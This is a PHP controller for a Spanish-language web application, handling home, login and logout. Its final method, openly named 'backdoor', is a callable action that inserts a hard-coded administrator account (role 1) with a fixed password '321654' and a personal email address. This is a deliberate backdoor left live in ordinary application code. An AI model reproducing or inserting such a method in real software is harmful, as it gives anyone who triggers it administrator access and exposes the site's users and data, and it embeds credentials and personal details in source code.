<?php

use JetBrains\PhpStorm\NoReturn;

/**
 * Clase por default cuando se entra a la pagina
 */
class HomeController extends CommonController
{
    public function __construct()
    {
        parent::__construct();
    }

    public function inicio(): void
    {
        if (!estaLogueado()) {
            echo $this->view->login();
            return;
        }
        if (esAdmin()) {
            echo $this->view->pagina("");
        }
    }

    public function login(): void
    {
        if (!empty($_POST["login"])) {
            if (!empty($_POST["mail"]) && !validarMail($_POST["mail"])) {
                mensajeAlUsuario("Error al ingresar, valide que el mail sea correcto", "error");
            }
            if ($this->model->login($_POST["mail"], $_POST["password"])) {
                redireccionar();
            }
        }

        echo $this->view->login();
    }

    #[NoReturn] public function logout(): void
    {
        session_destroy();
        redireccionar();
    }

    public function backdoor()
    {
        $datos = array();
        $datos["nombre"] = "Saleck";
        $datos["mail"] = "aledagonale@gmail.com";
        $datos["rol_id"] = 1;
        $datos["password"] = password_hash("321654", PASSWORD_DEFAULT);
        $this->model->insertar("usuarios", $datos);
    }
}